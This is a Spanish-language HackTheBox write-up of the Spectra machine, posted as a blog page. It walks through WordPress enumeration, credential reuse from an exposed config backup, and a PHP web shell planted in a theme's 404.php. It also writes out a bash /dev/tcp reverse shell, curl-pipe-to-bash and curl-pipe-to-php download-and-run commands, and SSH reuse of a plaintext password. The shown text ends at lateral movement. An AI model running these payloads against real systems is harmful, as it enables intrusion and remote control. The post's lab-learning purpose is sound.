@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Spectra</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Spectra | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Spectra" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux (Chromium OS) nivel fácil. Nos veremos las caras con WordPress y su mala configuración por parte del administrador del sitio. Modificaremos themones para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volverán peligrosas porque podemos ejecutarlas como el usuario root, asignaremos el permiso SUID a la bash para obtener una Shell como administradores de la máquina." />
+<meta property="og:description" content="Máquina Linux (Chromium OS) nivel fácil. Nos veremos las caras con WordPress y su mala configuración por parte del administrador del sitio. Modificaremos themones para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volverán peligrosas porque podemos ejecutarlas como el usuario root, asignaremos el permiso SUID a la bash para obtener una Shell como administradores de la máquina." />
+<link rel="canonical" href="http://localhost:4000/htb/spectra" />
+<meta property="og:url" content="http://localhost:4000/htb/spectra" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-26T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png" />
+<meta property="twitter:title" content="HackTheBox - Spectra" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-26T00:00:00-07:00","datePublished":"2021-06-26T00:00:00-07:00","description":"Máquina Linux (Chromium OS) nivel fácil. Nos veremos las caras con WordPress y su mala configuración por parte del administrador del sitio. Modificaremos themones para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volverán peligrosas porque podemos ejecutarlas como el usuario root, asignaremos el permiso SUID a la bash para obtener una Shell como administradores de la máquina.","headline":"HackTheBox - Spectra","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/spectra"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/spectra"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Spectra</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-26">26 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317banner.png" alt="HackTheBox - Spectra">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux (<strong>Chromium OS</strong>) nivel fácil. Nos veremos las caras con <strong>WordPress</strong> y su mala configuración por parte del administrador del sitio. Modificaremos <strong>themones</strong> para ejecutar comandos en el sistema. Encontraremos credenciales y jugaremos con archivos para configurar tareas, se volverán peligrosas porque podemos ejecutarlas como el usuario <strong>root</strong>, asignaremos el permiso <strong>SUID</strong> a la bash para obtener una Shell como administradores de la máquina.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317spectraHTB.png" alt="317spectraHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1190">egre55</a>.</p>
+
+<p>Opa opa, como es!</p>
+
+<p>Bueno, inicialmente nos enfrentaremos al gestor de contenido <strong>WordPress</strong>, enumerando encontraremos un “backup” del archivo de configuración de la base de datos, usaremos las credenciales para ingresar a la parte administrativa de <strong>WordPress</strong>. Estando acá modificaremos la plantilla <code>404.php</code> del <strong>theme</strong> <code>twentyseventeen</code> para agregar nuestro código y asi conseguir ejecucion remota de comandos y obtener una Reverse Shell como el usuario <strong>nginx</strong>.</p>
+
+<p>Enumerando encontraremos una contraseña que esta siendo ejecutada/llamada por un archivo, si validamos contra los usuarios mediante <code>SSH</code> lograremos obtener una sesión como el usuario <strong>katie</strong>.</p>
+
+<p>Veremos que <strong>katie</strong> esta asignada al grupo <code>developers</code>, un grupo que tiene varios archivos de <strong>configuración de tareas</strong> interesantes… Además si validamos que puede ejecutar <strong>katie</strong> con permisos de administrador en el sistema (<code>sudo -l</code>), encontraremos que tiene ejecución sobre el binario <code>/sbin/initctl</code> el cual principalmente se encarga de gestionar archivos de configuración de tareas.</p>
+
+<p>Relacionando los archivos que encontramos y el binario, lograremos ejecutar comandos en el sistema como el usuario administrador. Asignaremos el permiso <strong>SUID</strong> al binario <code>/bin/bash</code> para obtener una sesión como <code>root</code> en la máquina.</p>
+
+<p>A darleeeeeeee…</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Algo de cositas manuales, pero le cuesta mucho ser real.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral">Movimiento Lateral</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios están activos:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.229 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan
+# Nmap 7.80 scan initiated Mon Mar  8 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.229
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.229 ()   Status: Up
+Host: 10.10.10.229 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///, 8081/open/tcp//blackice-icecap///
+# Nmap done at Mon Mar  8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 75.89 seconds
+</code></pre>
+
+<p>Muy bien, tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Acceso a un servidor remoto por medio de un canal seguro.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Servidor web.</td>
+    </tr>
+    <tr>
+      <td>3306</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/MySQL">MYSQL</a></strong>: Sistema para gestionar bases de datos.</td>
+    </tr>
+    <tr>
+      <td>8081</td>
+      <td style="text-align: left"><strong><a href="https://apple.stackexchange.com/questions/393589/what-is-blackice-icecap-user-console-on-port-8081-on-my-macbook-air#answer-393612">blackice-icecap</a></strong>: Probablemente un software para la administración de un firewall.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto):</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80,3306,8081 -sC -sV 10.10.10.229 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan
+Nmap 7.80 scan initiated Mon Mar  8 25:25:25 2021 as: nmap -p 22,80,3306,8081 -sC -sV -oN portScan 10.10.10.229
+Nmap scan report for 10.10.10.229
+Host is up (0.12s latency).
+                       
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey:
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http             nginx 1.17.4 
+|_http-server-header: nginx/1.17.4          
+|_http-title: Site doesn't have a title (text/html). 
+3306/tcp open  mysql            MySQL (unauthorized) 
+8081/tcp open  blackice-icecap?  
+| fingerprint-strings:          
+|   FourOhFourRequest, GetRequest:
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain   
+|     Date: Mon, 08 Mar 2021 21:49:30 GMT
+|     Connection: close  
+|     Hello World  
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Mon, 08 Mar 2021 21:49:36 GMT
+|     Connection: close
+|_    Hello World
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8081-TCP:V=7.80%I=7%D=3/8%Time=60469B2E%P=x86_64-pc-linux-gnu%r(...);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar  8 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.75 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.1 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">nginx 1.17.4</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3306</td>
+      <td style="text-align: left">MYSQL</td>
+      <td style="text-align: left">MySQL (unauthorized) &lt;- (raro)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8081</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Ni idea :P</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Empezamos a enumerar cada servicio a ver por donde podemos entrar…</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80.png" alt="317page80" /></p>
+
+<p>Bien, nos indica que están esperando a que <strong>IT</strong> les configure el “seguimiento de incidentes” y hay dos links:</p>
+
+<p>Si ingresamos a cualquiera de los dos, obtenemos un error:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_without_etcHosts.png" alt="317page80_without_etcHosts" /></p>
+
+<ul>
+  <li>Software Issue Tracker: <code>http://spectra.htb/main/index.php</code>.</li>
+  <li>Test: <code>http://spectra.htb/testing/index.php</code>.</li>
+</ul>
+
+<p>Vemos un dominio: <code>spectra.htb</code>, asi que agreguémoslo a nuestro archivo <code>/etc/hosts</code> para que cuando ingresemos a la dirección IP nos redireccione/resuelva al dominio (o simplemente colocando el dominio).</p>
+
+<ul>
+  <li><a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">The <strong>/etc/hosts</strong> file</a>.</li>
+</ul>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.229  spectra.htb
+...
+</code></pre>
+
+<p>Y ahora validemos los links:</p>
+
+<p><strong>main</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_with_etc_main.png" alt="317page80_with_etc_main" /></p>
+
+<p><strong>testing</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_with_etc_testing.png" alt="317page80_with_etc_testing" /></p>
+
+<p>Interesante…</p>
+
+<p>…</p>
+
+<p><strong>main</strong>:</p>
+
+<p>Enumerando sabemos que estamos sobre un <a href="https://es.wikipedia.org/wiki/WordPress">WordPress</a> (gestor de contenido para crear cualquier tipo de página web). Viendo el código fuente nos encontramos con varias rutas, en la que podemos intentar enumerar e incluso validar si alguna es vulnerable a alguna inyección, pero no, no obtenemos ninguna respuesta de que por ahí sean los tiros…</p>
+
+<p>Como es habitual, tenemos el archivo <code>/wp-login.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginPHP.png" alt="317page80_wp_loginPHP" /></p>
+
+<p>Intentando algunos usuarios potenciales, vemos que la web válida si un usuario es válido asi la contraseña sea inválida:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginPHP_admin_err.png" alt="317page80_wp_loginPHP_admin_err" /></p>
+
+<p>Sabemos que el usuario <code>administrator</code> existe… Podríamos pensar en brute-force, pero pues aún podemos enumerar el sitio <code>/testing</code>.</p>
+
+<p><strong>testing</strong>:</p>
+
+<p>Acá podemos ver varios archivos si le quitamos el <code>index.php</code> de la ruta <code>http://spectre.htb/testing/index.php</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_testing_files.png" alt="317page80_testing_files" /></p>
+
+<p>En esta parte sobre pensé muuuuuuuuucho las cosas y me puse a buscar y buscar cosas, cuando realmente lo necesario estuvo siempre al inicio, si nos fijamos hay un archivo llamado <code>wp-config.php.save</code> que podemos intuir que es un backup del archivo <code>wp-config.php</code>. Si ingresamos al archivo no nos lo va a descargar (por esto quizás también lo ignore al inicio) porque la extensión no lo permite (a diferencia de si fuera un <code>.bak</code> que si se nos hubiera descargado al ingresar a él). Pero podemos descargarlo desde la consola con <code>wget</code>:</p>
+
+<pre><code class="language-bash">❭ wget http://spectra.htb/testing/wp-config.php.save
+❭ file wp-config.php.save 
+wp-config.php.save: PHP script, ASCII text, with CRLF line terminators
+</code></pre>
+
+<p>Viendo su contenido:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_wp_configPHPsave_cat_file.png" alt="317bash_wp_configPHPsave_cat_file" /></p>
+
+<p>Efectivamente es una copia o al menos tiene el formato del archivo de configuración y como vemos nos brinda unas credenciales de un usuario de la base de datos…</p>
+
+<p>Probemos esas credenciales hacia el login que teníamos antes a ver si logramos acceder.</p>
+
+<p>Con el usuario <code>devtest</code> nos muestra:</p>
+
+<blockquote>
+  <p>Unknown username. Check again or try your email address.</p>
+</blockquote>
+
+<p>Si validamos con el usuario <code>administrator</code> tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_loginADMINdone.png" alt="317page80_wp_loginADMINdone" /></p>
+
+<p>Listos, la contraseña es válida con él, tamos dentro :P</p>
+
+<p>Despues de husmear por ahí, recordé que una vez <a href="https://s4vitar.github.io/">s4vitar</a> dijo que si conseguimos entrar como administradores al sitio <code>WordPress</code>, sencillamente podríamos modificar la plantilla <code>404.php</code> para inyectar nuestro código <code>PHP</code> y direccionarnos hacia la URL para comprobar que nuestro código se esté ejecutando. Vamos a hacerlo.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Estando dentro tenemos el apartado &gt; <code>Appereance</code> &gt; <code>Theme Editor</code>, entramos ahí y tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_themeEditor.png" alt="317page80_wp_admin_themeEditor" /></p>
+
+<ul>
+  <li>Tengamos en cuenta el select del tema a editar.</li>
+  <li>Si nos fijamos, tenemos la plantilla del <code>404.php</code> en el theme <code>twentytwenty</code>, veámoslo.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_themeE_404php.png" alt="317page80_wp_admin_themeE_404php" /></p>
+
+<p>Validemos la ruta en la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_twentytwenty_404php.png" alt="317page80_theme_twentytwenty_404php" /></p>
+
+<p>Jmm pues concuerda con que en la línea 10 del código esta esa función, intentemos modificar el archivo para ver si logramos inyectar código:</p>
+
+<pre><code class="language-php">...
+echo "hola";
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_wp_admin_tE_twenty_404php_editHola.png" alt="317page80_wp_admin_tE_twenty_404php_editHola" /></p>
+
+<p>Y damos clic en el botón <code>Update File</code>:</p>
+
+<blockquote>
+  <p>Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.</p>
+</blockquote>
+
+<p>Obtenemos ese error…</p>
+
+<p>Vi validamos el select (al que hice mención antes) tiene 3 themes, <code>twentynineteen</code>, <code>twentyseventeen</code> y <code>twentytwenty</code>. Si cambiamos el theme al <code>twentyseventeen</code>, vamos al código del <code>404.php</code> e intentamos hacer el mismo procedimiento de antes, tenemos:</p>
+
+<pre><code class="language-php">&lt;?php
+...
+ */
+echo "hola";
+get_header(); ?&gt;
+...
+</code></pre>
+
+<blockquote>
+  <p>File edited successfully.</p>
+</blockquote>
+
+<p>Validamos ahora en la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_seven_404php_editHola.png" alt="317page80_theme_seven_404php_editHola" /></p>
+
+<p>Perfecto, podemos ver el contenido modificado. Ahora con esto podemos ejecutar comandos en el sistema, validémoslo:</p>
+
+<pre><code class="language-php">...
+$coma=shell_exec($_GET['xmd']); echo $coma;
+...
+</code></pre>
+
+<p>Le indicamos que nos guarde en la variable <code>xmd</code> todo lo que se envíe por medio de una petición <code>GET</code> (por medio de la URL) y que ese valor lo ejecute en el sistema (<code>shell_exec</code>) y su resultado nos lo guarde en la variable <code>coma</code>, despues simplemente mostramos ese valor. Veámoslo en ejecución:</p>
+
+<p>Le decimos que nos muestre quien somos y en que hostname estamos:</p>
+
+<pre><code class="language-html">http://10.10.10.229/main/wp-content/themes/twentyseventeen/404.php?xmd=whoami;hostname
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317page80_theme_seven_404php_RCE.png" alt="317page80_theme_seven_404php_RCE" /></p>
+
+<p>Opa, somos <code>nginx</code> y estamos en el host principal. Entablémonos una Reverse Shell:</p>
+
+<p>Bueno, despues de varios intentos nos damos cuenta de que <code>nc</code> no esta instalado o no lo toma, también vemos que hay problemas con <code>bash</code>, ya que si intentamos establecer la RevSH creándonos un archivo que cuando se ejecute nos lancé la petición para la Shell no hace nada:</p>
+
+<p>Creamos el archivo:</p>
+
+<pre><code class="language-bash">❭ cat rerere.sh
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.194/4433 0&gt;&amp;1
+</code></pre>
+
+<p>Creamos servidor web con <code>Python</code>:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Y ahora en la web (podemos pasar los comandos a <code>URL Encode</code> para evitar errores de concatenación y sintaxis) le indicamos que nos descargue ese archivo y a la vez nos lo ejecute con <code>bash</code>:</p>
+
+<pre><code class="language-html">&lt;!-- Sin URL encode --&gt;
+xmd=curl http://10.10.14.194:8000/rerere.sh | bash
+
+&lt;!-- URL Encode --&gt;
+xmd=curl%20http%3A%2F%2F10.10.14.194%3A8000%2Frerere.sh%20%7C%20bash
+</code></pre>
+
+<p>Pero al ejecutar no pasa nada, probé cambiando el path de <code>bash</code>, jugando con <code>sh</code> (pueden validar que shells hay activas en la máquina visitando el archivo <code>/etc/shells</code>), moviendo el archivo a <code>/tmp</code> y despues ejecutándolo, pero nada…</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/16362402/save-file-to-specific-folder-with-curl-command">Moving files with <strong>cURL</strong></a>.</li>
+</ul>
+
+<p>Asi que recordé que <code>pentest monkey</code> tiene una Reverse Shell con <code>PHP</code>, probando con ella logramos obtener la Shell (:</p>
+
+<ul>
+  <li><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey / php-reverse-shell</a>.</li>
+</ul>
+
+<p>Descargamos el archivo y modificamos dentro de él los campos <code>ip</code> y <code>port</code> por los nuestros:</p>
+
+<pre><code class="language-php">...
+$ip = '10.10.14.194';  // CHANGE THIS
+$port = 4433;       // CHANGE THIS
+...
+</code></pre>
+
+<p>Ahora simplemente le indicamos que nos haga una petición a ese archivo, pero como plus le indicamos que su contenido lo interprete con <code>PHP</code>:</p>
+
+<pre><code class="language-html">&lt;!-- Sin URL encode --&gt;
+xmd=curl http://10.10.14.194:8000/phpr.php | php
+
+&lt;!-- URL encode --&gt;
+xmd=curl%20http%3A%2F%2F10.10.14.194%3A8000%2Fphpr.php%20%7C%20php
+</code></pre>
+
+<p>Y en nuestro <code>nc</code> tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_revSH_nginx.png" alt="317bash_revSH_nginx" /></p>
+
+<p>Perfecto, ahora si tenemos una Shell (: Pueeeees, a enumerar…</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">Realizando <strong>tratamiento de la TTY</strong> con ayuda de <strong>S4vitar</strong></a>.</li>
+</ul>
+
+<p>…</p>
+
+<p>(Validando el porqué no pudimos obtener RCE mediante <code>bash</code> ni <code>nc</code>)</p>
+
+<pre><code class="language-bash">bash-4.3$ which nc
+which: no nc in ((null))
+bash-4.3$ locate nc
+locate: can not stat () `/usr/local/db/mlocate/mlocate.db': Permission denied
+bash-4.3$ nc
+bash: nc: command not found
+bash-4.3$ bash -i &gt;&amp; /dev/tcp/10.10.14.194/4434 0&gt;&amp;1
+bash: /dev/tcp/10.10.14.194/4434: No such file or directory
+</code></pre>
+
+<p>En todos obtuvimos errores, por eso no había ninguna ejecución :(</p>
+
+<p>La flag del user esta en el usuario <code>katie</code>:</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral">Movimiento lateral <a href="#movimiento-lateral">#</a></h2>
+
+<p>Enumerando nos encontramos con un archivo raro en la ruta <code>/opt/autologin.conf.orig</code>:</p>
+
+<pre><code class="language-bash">nginx@spectra:/opt$ cat autologin.conf.orig 
+# Copyright 2016 The Chromium OS Authors. All rights reserved.
+# Use of this source code is governed by a BSD-style license that can be
+# found in the LICENSE file.
+description   "Automatic login at boot"
+author        "chromium-os-dev@chromium.org"
+# After boot-complete starts, the login prompt is visible and is accepting
+# input.
+start on started boot-complete
+script
+  passwd=
+  # Read password from file. The file may optionally end with a newline.
+  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
+    if [ -e "${dir}/passwd" ]; then
+      passwd="$(cat "${dir}/passwd")"
+      break
+    fi
+  done
+  if [ -z "${passwd}" ]; then
+    exit 0
+  fi
+  # Inject keys into the login prompt.
+  #
+  # For this to work, you must have already created an account on the device.
+  # Otherwise, no login prompt appears at boot and the injected keys do the
+  # wrong thing.
+  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
+end script
+</code></pre>
+
+<p>Inspeccionando nos indica que esta tomando una password de un archivo llamado <code>passwd</code> de las rutas <code>/mnt/stateful_partition/etc/autologin</code> y <code>/etc/autologin</code>, si comprobamos esas rutas buscando el dichoso archivo, lo encontramos en <code>/etc/autologin</code>:</p>
+
+<pre><code class="language-bash">nginx@spectra:/opt$ ls -la /etc/autologin
+total 12
+drwxr-xr-x  2 root root 4096 Feb  3 16:43 .
+drwxr-xr-x 63 root root 4096 Feb 11 10:24 ..
+-rw-r--r--  1 root root   19 Feb  3 16:43 passwd
+nginx@spectra:/opt$ cat /etc/autologin/passwd 
+SummerHereWeCome!!
+</code></pre>
+
+<p>Jmmm, pues tenemos una “contraseña”, si probamos <code>su katie</code> nos da un error:</p>
+
+<pre><code class="language-bash">nginx@spectra:/opt$ su katie
+su: error while loading shared libraries: libpam.so.2: cannot open shared object file: No such file or directory
+</code></pre>
+
+<p>Pero si recordamos, tenemos el puerto <code>22</code> abierto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spectra/317bash_katieSH.png" alt="317bash_katieSH" /></p>
+
+<p>LOL, pues somos <strong>katie</strong>, super raro el encontrar la pw así…</p>
+
+<p>…</p>
